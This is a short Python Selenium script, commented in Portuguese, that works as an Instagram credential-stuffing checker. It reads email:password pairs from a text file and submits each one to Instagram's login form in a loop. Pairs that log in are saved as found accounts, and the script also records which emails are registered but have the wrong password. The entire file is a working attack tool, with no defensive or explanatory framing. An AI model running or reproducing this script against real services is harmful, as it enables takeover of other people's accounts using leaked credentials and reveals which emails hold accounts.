from os import system
from typing import Text
from selenium import webdriver
from time import sleep
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from sys import exit

f = open("EMAILS-ENCONTRADOS", "w")
contador = 0
while(1):
    f = open("EMAILS-ENCONTRADOS", "a")
    PATH = "C:\Program Files (x86)\msedgedriver.exe"

    driver = webdriver.Edge(PATH)
    driver.get("https://www.instagram.com/")
    sleep(5)

    file_variable = open('emails.txt')
    all_lines_variable = file_variable.readlines()
    print(contador)
    if all_lines_variable[contador] == 'fim':
        exit()
    email = all_lines_variable[contador].split(":")
    contador = contador + 1
    try:
        search = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "username"))
    )
        search.send_keys(email[0])
        search = driver.find_element_by_name("password")
        search.send_keys(email[1], Keys.RETURN)
    finally:
        pass
    try:
        element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, "olLwo"))
        )
        f.write(f"{email[0]}:{email[1]}INSTAGRAM ENCONTRADO.\n")
    except:
        pass
    try:
        element = WebDriverWait(driver,5).until(
            EC.presence_of_element_located((By.ID, "slfErrorAlert"))
        )
        if element.text == "Sua senha está incorreta. Confira-a.":
            f.write(f"{email[0]}:{email[1]}EMAIL CADASTRADO, POREM SENHA ERRADA.\n")
        else:
            print("ESSE AQUI N LOGO")
        print(element.text)
    except:
        pass
    finally:
        driver.close()
        f.close()
